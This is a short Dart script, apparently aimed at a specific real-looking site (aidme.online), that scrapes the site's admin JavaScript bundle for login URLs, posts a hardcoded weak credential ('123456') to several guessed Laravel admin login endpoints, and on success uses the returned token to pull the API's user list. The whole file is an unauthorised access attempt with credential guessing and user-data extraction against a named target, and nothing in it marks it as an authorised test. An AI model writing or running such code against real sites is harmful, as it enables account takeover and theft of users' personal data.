import 'package:dio/dio.dart';

void main() async {
  final dio = Dio();
  final response =
      await dio.get('https://Admin.aidme.online/assets/index-Blv9z7a7.js');
  final jsCode = response.data.toString();

  // Find strings like "login"
  final lines = jsCode.split(',');
  for (var line in lines) {
    if (line.contains('login') && line.contains('http')) {
      print('Possible login URL: \$line');
    }
  }

  // Common Laravel admin endpoints
  final endpoints = [
    'https://api.aidme.online/api/admin/login',
    'https://api.aidme.online/admin/login',
    'https://api.aidme.online/auth/login',
    'https://api.aidme.online/api/auth/login'
  ];

  for (var url in endpoints) {
    try {
      print('\\nTesting POST \$url');
      final resp = await dio.post(url, data: {
        'username': 'ts2025',
        'email': 'ts2025',
        'password': '123456'
      });
      print('Success! Token: \${resp.data}');
      if (resp.data['token'] != null) {
        final token = resp.data['token'];
        // Try getting users with token
        final getResp = await dio.get('https://api.aidme.online/api/users',
            options: Options(headers: {'Authorization': 'Bearer \$token'}));
        print('Users: \${getResp.data}');
      }
      return;
    } catch (e) {
      if (e is DioException) {
        print('Failed \${e.response?.statusCode}');
      }
    }
  }
}
